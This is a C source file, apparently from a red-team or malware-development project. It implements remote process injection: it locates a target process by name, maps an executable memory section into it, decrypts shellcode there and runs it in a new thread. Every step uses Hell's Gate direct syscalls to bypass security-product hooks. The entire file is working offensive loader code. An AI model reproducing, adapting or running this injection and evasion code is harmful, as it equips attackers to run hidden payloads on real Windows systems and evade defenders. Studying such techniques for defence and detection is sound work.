/*
 *  ~ injection.c ~
 * Remote injection logic
 * Author: jakobfriedl
 */

#include "base.h"

BOOL GetRemoteProcessHandle(IN PVX_TABLE pVxTable, IN LPCWSTR lpProcessName, OUT HANDLE* hProcess, OUT DWORD* dwProcessId) {

    PRINTW(L"\n[~~~] Searching for process %s...\n", lpProcessName); 

    BOOL bState = TRUE;
    NTSTATUS STATUS = NULL;

    HMODULE hNtdll = NULL;
    PSYSTEM_PROCESS_INFORMATION ProcInfo = NULL;
    ULONG uReturnLength1 = NULL;
    ULONG uReturnLength2 = NULL;
    PVOID pValueToFree = NULL;

    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    CLIENT_ID cId = { 0 }; 

    /// Get System Information
    // https://ntdoc.m417z.com/ntquerysysteminformation
    
    // First NtQuerySystemInformation call will fail but provide information about how much memory needs to be allocated via uReturnLength
    HellsGate(pVxTable->NtQuerySystemInformation.wSystemCall); 
    STATUS = HellDescent(SystemProcessInformation, NULL, NULL, &uReturnLength1);
    ProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLength1);
    if (!ProcInfo) {
        PRINT_ERROR("HeapAlloc");
        bState = FALSE;
        goto CLEANUP;
    }

    // Second NtQuerySystemInformation call
    HellsGate(pVxTable->NtQuerySystemInformation.wSystemCall); 
    STATUS = HellDescent(SystemProcessInformation, ProcInfo, uReturnLength1, &uReturnLength2);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtQuerySystemInformation]");
        bState = FALSE;
        goto CLEANUP;
    }

    // Since we will modify 'SystemProcInfo', we will save its initial value before the while loop to free it later
    pValueToFree = ProcInfo;

    // Loop over processes
    while (TRUE) {
        /// Compare every process name to the one we are looking ofr
        if (ProcInfo->ImageName.Length && wcscmp(ProcInfo->ImageName.Buffer, lpProcessName) == 0) {
            *dwProcessId = ProcInfo->UniqueProcessId;

            // Get handle via NtOpenProcess (https://ntdoc.m417z.com/ntopenprocess) 
            cId.UniqueProcess = ProcInfo->UniqueProcessId; 
            HellsGate(pVxTable->NtOpenProcess.wSystemCall);
            STATUS = HellDescent(hProcess, PROCESS_ALL_ACCESS, &OA, &cId); 
            if (STATUS != STATUS_SUCCESS) {
                PRINT_NTERROR("HellDescent [NtOpenProcess]");
                bState = FALSE;
                goto CLEANUP; 
            }

            break;
        }

        // If NextEntryOffset is 0, we reached the end of the array
        if (!ProcInfo->NextEntryOffset)
            break;

        // Move to the next element in the array
        ProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)ProcInfo + ProcInfo->NextEntryOffset);
    }

CLEANUP:

    HeapFree(GetProcessHeap(), 0, pValueToFree);

    return bState;
}

BOOL InvokeMappingInjection(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSize) {

    PRINTA("[~~~] Starting injection...\n"); 

    NTSTATUS STATUS = NULL;
    BOOL bState = TRUE;

    HANDLE hSection = NULL;
    LARGE_INTEGER MaximumSize = {
        .HighPart = 0,
        .LowPart = sSize
    };
    HANDLE hLocalProcess = (HANDLE)-1;
    PBYTE pLocalAddress = NULL;
    PBYTE pRemoteAddress = NULL;
    SIZE_T sViewSize = NULL;
    HANDLE hThread = NULL;

    // Allocate local Map View using NtCreateSection and NtMapViewOfSection
    HellsGate(pVxTable->NtCreateSection.wSystemCall); 
    STATUS = HellDescent(&hSection, (SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE), NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtCreateSection]");
        bState = FALSE;
        goto CLEANUP;
    }
    OKAY("[ 0x%p ] [ RWX ] Created section.", hSection);

    HellsGate(pVxTable->NtMapViewOfSection.wSystemCall); 
    STATUS = HellDescent(hSection, hLocalProcess, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtMapViewOfSection] [1]");
        bState = FALSE;
        goto CLEANUP;
    }
    OKAY("[ 0x%p ] [ RW- ] Allocated %d bytes in local process.", pLocalAddress, sViewSize);

    // Copy payload to memory
    CopyMemoryEx(pLocalAddress, pShellcode, sSize); 
    OKAY("[ 0x%p ] Copied %d bytes to address.", pLocalAddress, sSize);

    // Allocate remote Map View using NtMapViewOfSection
    HellsGate(pVxTable->NtMapViewOfSection.wSystemCall); 
    STATUS = HellDescent(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtMapViewOfSection] [2]");
        bState = FALSE;
        goto CLEANUP;
    }
    OKAY("[ 0x%p ] [ RWX ] Allocated %d bytes in remote process.", pRemoteAddress, sViewSize);

    // Decrypt payload stored at local address and thus decrypting the payload in the remote process aswell
    if (!Decrypt(pLocalAddress, sSize)) {
        PRINT_ERROR("Decrypt");
        return EXIT_FAILURE;
    }
    OKAY("[ 0x%p ] Decrypted payload.", pLocalAddress);
    PrintByteArray(pLocalAddress, sSize);

    // Execute payload using thread creation with NtCreateThreadEx
    HellsGate(pVxTable->NtCreateThreadEx.wSystemCall); 
    STATUS = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PTHREAD_START_ROUTINE)pRemoteAddress, NULL, 0, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtCreateThreadEx]");
        bState = FALSE;
        goto CLEANUP;
    }
    OKAY("[ 0x%p ] Thread created.", hThread);

    // Wait for the thread to finish executing
    HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall); 
    STATUS = HellDescent(hThread, FALSE, NULL);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtWaitForSingleObject]");
        bState = FALSE;
        goto CLEANUP;
    }

CLEANUP:

    // Unmap local view using NtUnmapViewOfSection
    HellsGate(pVxTable->NtUnmapViewOfSection.wSystemCall); 
    STATUS = HellDescent(hLocalProcess, pLocalAddress);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtUnmapViewOfSection] [1]");
        bState = FALSE;
    }
    OKAY("[ 0x%p ] Unmapped view in local process.", pLocalAddress);

    // Unmap remote view using NtUnmapViewOfSection
    HellsGate(pVxTable->NtUnmapViewOfSection.wSystemCall); 
    STATUS = HellDescent(hProcess, pRemoteAddress);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtUnmapViewOfSection] [2]");
        bState = FALSE;
    }
    OKAY("[ 0x%p ] Unmapped view in remote process.", pRemoteAddress)

    // Close Handles using NtCloseHandle
    if (hSection) {
        HellsGate(pVxTable->NtClose.wSystemCall); 
        STATUS = HellDescent(hSection);
        if (STATUS != STATUS_SUCCESS) {
            PRINT_NTERROR("HellDescent [NtClose] [1]");
            bState = FALSE;
        }
        OKAY("[ 0x%p ] Closed section handle", hSection);
    }

    if (hThread) {
        HellsGate(pVxTable->NtClose.wSystemCall); 
        STATUS = HellDescent(hThread);
        if (STATUS != STATUS_SUCCESS) {
            PRINT_NTERROR("HellDescent [NtClose] [2]");
            bState = FALSE;
        }
        OKAY("[ 0x%p ] Closed thread handle", hThread);
    }

    return bState;
}